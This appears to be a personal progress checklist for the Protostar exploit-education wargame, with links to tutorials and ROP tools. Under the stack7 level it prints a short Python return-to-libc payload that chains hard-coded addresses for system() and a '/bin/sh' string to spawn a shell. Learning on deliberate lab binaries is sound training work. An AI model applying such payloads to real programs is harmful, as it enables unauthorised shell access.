# Protostar

## Stack
- [x] stack0
- [x] stack1
- [x] stack2
- [x] stack3
- [x] stack4
- [x] stack5
- [x] stack6
- [x] stack7
```
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
return_op = struct.pack("I",0x08048544)
call_system = struct.pack("I",0xb7ecffb0)
after_system_execution = struct.pack("I",0xb7ec60c0)
bin_sh_path = struct.pack("I",0xb7fb63bf)
print padding + return_op + call_system + after_system_execution + bin_sh_path
```

## Format String
- [ ] format0
- [ ] format1
- [ ] format2
- [ ] format3
- [ ] format4

## Heap
- [ ] heap0
- [ ] heap1
- [ ] heap2
- [ ] heap3

## Network

- [ ] net0
- [ ] net1
- [ ] net2

## Final
- [ ] final0
- [ ] final1
- [ ] final2

# Reference
- https://old.liveoverflow.com/binary_hacking/protostar/index.html
- https://exploit.education/protostar/
- https://ctf101.org/binary-exploitation/overview/

# Writeup & Video
- https://kevinalmansa.github.io/write-ups/Protostar-Stack-Write-up/
- https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
- https://failingsilently.wordpress.com/exploit-development/

# Tools
- https://github.com/inaz2/roputils
- https://github.com/JonathanSalwan/ROPgadget
